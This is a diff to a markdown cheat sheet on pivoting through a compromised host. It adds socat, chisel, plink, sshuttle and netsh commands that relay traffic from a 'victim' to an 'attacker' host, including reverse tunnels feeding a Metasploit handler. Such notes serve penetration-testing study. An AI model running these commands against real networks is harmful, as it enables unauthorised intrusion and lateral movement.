@@ -15,7 +15,7 @@ To be noted:
  - Only TCP Connect Scan is supported by proxychains (default with nmap)
  - sudo is mandatory (RAW socket by proxychains)
 
-## Reverse tunneling from other_host
+## Proxy SOCKS with MSF
 
 ### On attacker
 
@@ -108,7 +108,7 @@ $ sudo proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
 
 #### Ports forwarding
 
-##### Local => Pivot => Victim
+##### Local => Victim => Other Host
 
 Useful to interact with a local post and use local tools.
 
@@ -125,7 +125,7 @@ Interact with service
 $ curl http://localhost:8080/
 ```
 
-##### Victime => Pivot => Local
+##### Other Host => Victim => Local
 
 Useful to get reverse shell to connect to local meterpreter
 
@@ -155,6 +155,60 @@ msf6 exploit(multi/handler) > set lport 8081
 msf6 exploit(multi/handler) > run
 ```
 
+## Port forwarding with SOCAT
 
+### Local => Victim => Other Host
 
+On **victim**:
+```bash
+$ socat TCP4-LISTEN:8080,fork TCP4:other_host:8443
+$ netstat -antop | grep socat
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      4207/socat           off (0.00/0/0)
+```
 
+###  Other Host => Victim => Local
+
+Reverse tunneling from other_host to attacker through victim
+
+On **victim**:
+```bash
+$ socat TCP4-LISTEN:1234,fork TCP4:attacker:8081
+$ netstat -antop | grep socat
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      4207/socat           off (0.00/0/0)
+```
+
+## Other tools
+
+ - plink : `plink -ssh -D 9050 ubuntu@10.129.15.50`
+ - sshuttle: `sudo sshuttle -r root@victim "subnet other host"/23 -v`
+ - rpivot
+ - DNS Tunneling: dnscat2
+ - ICMP Tunneling: ptunnel-ng
+
+### chisel
+
+On **attacker**
+```
+$ chisel server -v --socks5 --reverse --port 5036
+$ tail /etc/proxychains4.conf                        
+[ProxyList]
+socks5  127.0.0.1 5136
+```
+
+On **Victim**:
+```bash
+$ chisel client 172.22.0.36:5036 R:5136:socks
+```
+
+After connection from chisel **Victim**, on **attacker**:
+```bash
+$ sudo netstat -antop | grep chisel
+tcp        0      0 127.0.0.1:5136          0.0.0.0:*               LISTEN      1449854/./chisel_1.  off (0.00/0/0)
+```
+
+### netsh
+
+On Windows **Victim**:
+```
+netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
+```
